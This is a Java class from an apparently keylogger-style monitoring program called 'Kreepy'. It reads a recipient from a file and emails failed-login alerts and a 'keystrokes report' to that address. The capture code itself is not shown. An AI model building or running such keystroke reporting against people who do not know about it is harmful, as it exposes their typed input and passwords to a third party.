import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.Timer;
import javax.mail.MessagingException;
import javax.mail.internet.AddressException;

/*
	Kreepy Emailer Service
 */

public class emailHelper {
   
    private mailSender sendMail;
    private Timer dispatchTimer;
    private String recipent;
    private boolean enabled;
    int timeDelay;

    public emailHelper() 
    {
    	FilePermissions fp=new FilePermissions();
    	String username;
    	String password;
    	String recipent;
    	
    	username="#YOUR_EMAIL_HERE";
    	password="YOUR_EMAIL_PASSWORD_HERE";
    	
    	FileReader fr;
		try {
			String delay_time;
			File f=new File("lib/docs/emailService.txt");
			fp.GrantFilePermissions(f);
			fr = new FileReader(f);
			BufferedReader br=new BufferedReader(fr);
			String line;
			recipent=br.readLine();
			delay_time=br.readLine();
			br.close();
			fr.close();
			fp.RevokeFilePermissions(f);
			System.out.println("\nRecipent:"+recipent);
			System.out.println("Delay Time:"+delay_time);
			timeDelay= Integer.parseInt(delay_time);

			sendMail = new mailSender(username, password,recipent);
			this.recipent = recipent;
			
		} catch (IOException e) {

		}
    }

    public void emailUnsuccesfulLogin(String logDetails) 
    {
    	String body;
    	this.sendMail.setSubject("Kreepy ALERT::Failed Login Attempt");
    	body=logDetails+"\nSafe and secure Monitoring always..."+
    	"\n\n@Kreepy Team"+"\n\n\nPS:You can disable this service via settings dialog.";
    	
    	this.sendMail.setBody(body);
    	this.sendMail.InitializeEmailer();
    	this.sendMail.sendEmail();
    }
    
    public void emailKeystrokesReport() throws AddressException, MessagingException, IOException
    {
    	this.sendMail.sendKeystrokesReport();
    }
}